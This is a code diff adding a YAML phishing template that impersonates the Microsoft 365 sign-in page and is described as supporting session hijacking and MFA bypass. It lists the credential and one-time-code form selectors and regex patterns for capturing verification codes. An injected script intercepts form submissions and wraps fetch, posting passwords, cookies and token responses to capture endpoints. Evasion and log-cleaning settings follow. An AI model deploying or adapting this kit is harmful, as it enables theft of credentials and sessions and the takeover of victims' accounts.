@@ -1,0 +1,91 @@
+name: "Office 365 Advanced"
+description: "Advanced Office 365 phishing template with session hijacking and MFA bypass"
+author: "Vantablack Team"
+version: "2.0"
+
+base_domain: "login.microsoftonline.com"
+target_url: "https://login.microsoftonline.com/common/oauth2/authorize"
+
+credentials:
+  username_selector: "input[name='loginfmt']"
+  password_selector: "input[name='passwd']"
+  submit_selector: "input[type='submit']"
+
+mfa:
+  enabled: true
+  sms_code_pattern: '(\d{6})'
+  email_code_pattern: '(Your Microsoft verification code is |Code: )(\d{6})'
+  app_code_selector: "input[name='otc']"
+
+session_capture:
+  cookies: true
+  local_storage: true
+  session_storage: true
+  headers:
+    - "Authorization"
+    - "X-Requested-With"
+    - "User-Agent"
+
+injection_points:
+  - selector: "body"
+    position: "beforeend"
+    script: |
+      <script>
+        // Session hijacking script
+        document.addEventListener('DOMContentLoaded', function() {
+          // Capture all form submissions
+          const forms = document.querySelectorAll('form');
+          forms.forEach(form => {
+            form.addEventListener('submit', function(e) {
+              const formData = new FormData(form);
+              const data = Object.fromEntries(formData.entries());
+              
+              // Send captured data to our server
+              fetch('/_capture/credentials', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                  url: window.location.href,
+                  data: data,
+                  cookies: document.cookie,
+                  timestamp: new Date().toISOString()
+                })
+              });
+            });
+          });
+
+          // Monitor AJAX requests
+          const originalFetch = window.fetch;
+          window.fetch = function(...args) {
+            return originalFetch.apply(this, args).then(response => {
+              if (args[0].includes('/api/') || args[0].includes('/token')) {
+                response.clone().json().then(data => {
+                  fetch('/_capture/tokens', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                      url: args[0],
+                      data: data,
+                      timestamp: new Date().toISOString()
+                    })
+                  });
+                });
+              }
+              return response;
+            });
+          };
+        });
+      </script>
+
+evasion:
+  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+  referrer_policy: "no-referrer-when-downgrade"
+  ip_rotation: true
+  request_delay: 1000
+
+opsec:
+  log_cleaning: true
+  memory_only_storage: true
+  encrypted_logs: true
